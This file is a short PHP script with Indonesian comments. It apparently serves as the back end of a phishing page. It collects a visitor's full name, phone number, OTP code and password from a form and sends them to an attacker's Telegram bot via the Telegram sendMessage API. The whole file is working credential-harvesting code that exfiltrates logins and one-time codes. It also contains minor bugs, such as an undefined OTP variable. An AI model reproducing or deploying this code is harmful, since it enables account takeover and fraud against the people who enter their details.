<?php
include "telegram.php";
session_start();
// Data yang diterima dari form
$full_name = $_POST['validateFullName'];
$phone_number = $_POST['validatePhoneNumber'];
$otp_code = $_POST['otp_code'];
$password = $_POST['password'];
$_SESSION['full_name'] = $full_name;
$_SESSION['phone_number'] = $phone_number;
$_SESSION['full_name'] = $full_name;
$_SESSION['otp'] = $otp;
// Pesan yang akan dikirim ke bot Telegram
$message = "
(---------------->)
Full Name : ".$full_name."
Nomor : ".$phone_number."
Code otp : ".$otp."
Password : ".$password."
";

// URL endpoint untuk mengirim pesan ke bot Telegram
$telegramAPIURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

// Menggunakan cURL untuk membuat permintaan POST ke API Telegram
$ch = curl_init($telegramAPIURL);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $telegramChatID,
    'text' => $message,
]);
curl_exec($ch);
curl_close($ch);

// Proses selanjutnya sesuai kebutuhan Anda

?>
